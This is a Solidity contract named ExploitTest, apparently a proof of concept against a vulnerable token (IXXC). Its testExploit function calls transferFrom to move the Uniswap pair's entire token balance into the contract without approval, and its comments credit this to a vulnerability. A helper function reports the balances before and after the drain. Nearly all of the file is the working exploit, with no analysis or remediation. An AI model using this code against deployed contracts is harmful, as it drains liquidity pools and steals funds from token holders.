// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IXXC {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest {
    IXXC public token;
    address public uniswapPair;

    constructor(address _token, address _uniswapPair) {
        token = IXXC(_token);
        uniswapPair = _uniswapPair;
    }

    // Function to test the exploit
    function testExploit() external returns (bool) {
        // Get balance of uniswapPair
        uint256 pairBalance = token.balanceOf(uniswapPair);

        // Try to transfer tokens from uniswapPair to this contract
        // This should work without any approval due to the vulnerability
        bool success = token.transferFrom(
            uniswapPair, // sender (uniswapPair)
            address(this), // recipient (not deadWallet)
            pairBalance // amount to transfer
        );

        return success;
    }

    // Function to check balances before and after exploit
    function checkBalances() external view returns (uint256, uint256) {
        return (token.balanceOf(uniswapPair), token.balanceOf(address(this)));
    }
}
